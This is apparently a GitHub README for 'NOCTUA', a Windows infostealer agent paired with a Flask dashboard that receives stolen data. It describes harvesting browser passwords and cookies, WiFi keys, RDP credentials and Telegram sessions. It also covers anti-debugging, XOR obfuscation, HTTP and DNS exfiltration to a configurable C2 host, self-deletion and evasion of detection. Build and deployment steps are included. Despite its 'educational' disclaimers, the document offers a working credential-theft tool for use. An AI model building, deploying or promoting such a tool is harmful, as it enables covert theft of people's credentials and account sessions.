# 🦉 NOCTUA - Credential Intelligence Framework

```
████████╗██╗  ██╗███████╗    ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗ █████╗ 
╚══██╔══╝██║  ██║██╔════╝    ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗
   ██║   ███████║█████╗      ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║███████║
   ██║   ██╔══██║██╔══╝      ██║╚██╗██║██║   ██║██║        ██║   ██║   ██║██╔══██║
   ██║   ██║  ██║███████╗    ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
```
*Copyright (c) 2025 Adam-ZS — https://github.com/Adam-ZS*

[![Platform](https://img.shields.io/badge/platform-Windows%20x64-blue)]()
[![Agent](https://img.shields.io/badge/lang-C%2B%2B11-purple)]()
[![Dashboard](https://img.shields.io/badge/dashboard-Flask%202.3-cyan)]()
[![License](https://img.shields.io/badge/license-EDUCATIONAL-red)]()

**NOCTUA** is a two-component credential assessment framework designed for authorized security testing and educational purposes. It consists of a Windows agent for credential collection and a Flask-based web dashboard with a glassmorphism dark UI for data analysis.

---

## ⚠️ Legal Disclaimer

> **This tool is for authorized security testing and educational purposes ONLY.**
> 
> Unauthorized access to computer systems is illegal. The developers assume no liability
> and are not responsible for any misuse or damage caused by this program.
> 
> **You must have explicit written permission** before testing any system you do not own
> or have been authorized to test. By using this software, you agree to use it only for
> legal purposes in accordance with all applicable laws.

---

## ✨ Features

### Agent
- 🔐 **Chrome / Edge / Brave / Opera / Vivaldi** password harvesting via SQLite + DPAPI
- 🌐 **Cookie extraction** from Chromium-based browsers
- 📡 **WiFi credentials** via WLAN API (WlanGetProfile with plaintext keys)
- 🖥️ **RDP credentials** from Credential Manager (TermSrv/TerminalServer)
- 💬 **Telegram session** extraction (authkey, maps, USERS files)
- 🛡️ **Anti-debug** protection (IsDebuggerPresent, NtGlobalFlag, RDTSC timing)
- 🔒 **XOR string obfuscation** at compile time and runtime
- 📤 **Multiple exfiltration methods**: HTTP POST, DNS TXT queries, local file
- 🔄 **User-agent rotation** for HTTP exfiltration
- 🧵 **Multi-threaded collection** with staggered delays
- 🗑️ **Self-delete** option via batch script
- 🔍 **Single-instance** mutex guard

### Dashboard
- 🎨 **Glassmorphism dark UI** with backdrop-filter blur effects
- 📊 **Real-time statistics** (total count, category breakdowns)
- 🔍 **Search & filter** by keyword, target type, category
- 📋 **One-click copy** for passwords and full credentials
- 📥 **Export** to JSON and CSV formats
- 🗑️ **Credential management** (delete individual, visible, or all)
- 🔄 **Auto-polling** every 3 seconds with connection status
- 🎯 **Responsive design** for desktop and mobile
- 📱 **Toast notifications** for all actions

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    TARGET WINDOWS SYSTEM                            │
│                                                                     │
│  ┌───────────┐  ┌──────────┐  ┌───────────┐  ┌──────────────────┐  │
│  │ Chrome/   │  │  WLAN    │  │  Cred     │  │  Telegram        │  │
│  │ Edge/Brave│  │  API     │  │  Manager  │  │  tdata           │  │
│  │ DPAPI     │  │  WiFi    │  │  RDP      │  │  Session         │  │
│  └─────┬─────┘  └────┬─────┘  └─────┬─────┘  └───────┬──────────┘  │
│        │              │              │                │             │
│        └──────────────┴──────────────┴────────────────┘             │
│                                │                                     │
│                         ┌──────▼──────┐                              │
│                         │   NOCTUA    │                              │
│                         │   Agent     │                              │
│                         │ (C++ .exe)  │                              │
│                         └──────┬──────┘                              │
│                                │                                     │
│                    ┌───────────┴───────────┐                         │
│                    │     Exfiltration       │                        │
│                    │  HTTP / DNS / File     │                        │
│                    └───────────┬───────────┘                         │
└────────────────────────────────┼─────────────────────────────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │    Flask Dashboard       │
                    │  (Python / SQLite)       │
                    │  POST /api/collect       │
                    │  GET  /api/data          │
                    └─────────────────────────┘
```

---

## 📦 Components

### Agent (`agent/`)
| File | Description |
|------|-------------|
| `src/main.cpp` | WinMain entry, anti-debug, thread management, self-delete |
| `src/obfuscate.h` | XOR compile-time/runtime string encryption, anti-debug helpers |
| `src/config.h` | XOR-obfuscated compile-time configuration macros |
| `src/dumper.h` | Abstract dumper base class with utility functions |
| `src/chrome.cpp` | Chrome/Edge/Brave/Opera/Vivaldi password & cookie dumper |
| `src/wifi.cpp` | WiFi credentials via WLAN API |
| `src/rdp.cpp` | RDP credentials via CredEnumerateW + .rdp file parsing |
| `src/telegram.cpp` | Telegram Desktop session extraction |
| `src/exfil.cpp` | JSON serialization, HTTP/DNS/file exfiltration |
| `CMakeLists.txt` | CMake cross-compile configuration |
| `Makefile` | Simple MinGW makefile |

### Dashboard (`dashboard/`)
| File | Description |
|------|-------------|
| `app.py` | Flask application with REST API + SQLite storage |
| `requirements.txt` | Python dependencies |
| `templates/index.html` | Glassmorphism dashboard HTML |
| `static/css/style.css` | Full glassmorphism dark theme CSS |
| `static/js/app.js` | Auto-polling, search, copy, export, toast JS |

---

## 🚀 Quick Start

### Dashboard Setup

```bash
# Install dependencies
cd dashboard
pip install -r requirements.txt

# Run the dashboard
python app.py
# → Listening on http://0.0.0.0:5000
```

### Agent Build (Linux cross-compile)

```bash
# Install MinGW cross-compiler
sudo apt-get install mingw-w64 upx-ucl

# Build with Make
cd agent
make

# Or with CMake
mkdir build && cd build
cmake .. -DCMAKE_TOOLCHAIN_FILE=../cmake/mingw-toolchain.cmake
make

# Output: noctua_agent.exe
```

### Agent Build (Windows native)

```bash
# Using Visual Studio Developer Command Prompt
cl /EHsc /Fe:noctua_agent.exe src/*.cpp /link crypt32.lib secur32.lib wininet.lib ws2_32.lib ole32.lib credui.lib wlanapi.lib shlwapi.lib shell32.lib /SUBSYSTEM:WINDOWS
```

### Deployment

1. Start the dashboard: `python app.py`
2. Deploy `noctua_agent.exe` on target Windows system
3. Agent collects credentials and sends them to dashboard via HTTP POST
4. View harvested data at `http://your-server:5000`

---

## 📡 API Reference

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/` | Dashboard UI |
| `POST` | `/api/collect` | Receive credentials from agent |
| `GET` | `/api/data` | Get credentials (with search/filter/pagination) |
| `DELETE` | `/api/data` | Delete credentials (all / by id / by target) |
| `GET` | `/api/stats` | Get credential statistics |
| `GET` | `/api/export/json` | Export credentials as JSON |
| `GET` | `/api/export/csv` | Export credentials as CSV |
| `GET` | `/api/config` | Get configuration |
| `POST` | `/api/config` | Update configuration |
| `GET` | `/api/health` | Health check |

### POST /api/collect Example

```json
{
  "computer_name": "DESKTOP-ABC123",
  "username": "jdoe",
  "credentials": [
    {
      "target": "Chrome",
      "username": "admin@example.com",
      "password": "P@ssw0rd!",
      "url": "https://example.com/login",
      "notes": "Chrome Login Data"
    },
    {
      "target": "WiFi",
      "username": "Corp-Network",
      "password": "WiFiP@ss!",
      "url": "",
      "notes": "Interface: Intel Wi-Fi 6 AX201"
    }
  ]
}
```

---

## 🔒 OPSEC Considerations

- **XOR obfuscation** protects strings at rest in the binary
- **Anti-debug** checks help prevent analysis in sandbox environments
- **Staggered delays** between thread launches to avoid behavioral detection
- **User-agent rotation** for HTTP exfiltration traffic
- **DNS exfiltration** as fallback when HTTP is blocked
- **Hidden file attributes** for file-based exfiltration
- **Self-delete** option to remove traces after execution
- **Single-instance mutex** prevents multiple simultaneous executions

---

## 🛠️ Customization

Edit `agent/src/config.h` to configure:

```cpp
#define C2_HOST        XOR_LIT("your-server.com")     // C2 server
#define C2_PORT        XOR_LIT("5000")                 // C2 port
#define EXFIL_METHOD   XOR_LIT("http")                  // http, dns, file
#define SELF_DELETE    XOR_LIT("0")                     // 1 to enable
```

---

## 📚 Requirements

### Agent Build
- MinGW-w64 (Linux) or MSVC (Windows)
- Windows SDK headers (shipped with MinGW/MSVC)

### Dashboard
- Python 3.8+
- Flask 2.3+
- Flask-CORS

---

## 🧪 Compatibility

| Browser | Passwords | Cookies |
|---------|-----------|---------|
| Google Chrome | ✅ | ✅ |
| Microsoft Edge | ✅ | ✅ |
| Brave Browser | ✅ | ✅ |
| Opera | ✅ | ❌ |
| Vivaldi | ✅ | ❌ |

| Feature | Status |
|---------|--------|
| WiFi (WPA/WPA2) | ✅ |
| RDP Credential Manager | ✅ |
| RDP .rdp files | ✅ |
| Telegram Desktop | ✅ |

---

## 🤝 Contributing

This project is for educational purposes. Contributions that improve detection evasion
or add offensive capabilities will not be accepted.

---

## 📄 License

Copyright (c) 2025 **Adam-ZS** — https://github.com/Adam-ZS

**EDUCATIONAL USE ONLY** — See [LICENSE](LICENSE) for full terms.

Unauthorized access to computer systems is illegal. You must have explicit written permission before testing any system you do not own.

---

*Built with 🦉 by [Adam-ZS](https://github.com/Adam-ZS) for authorized testing and education.*
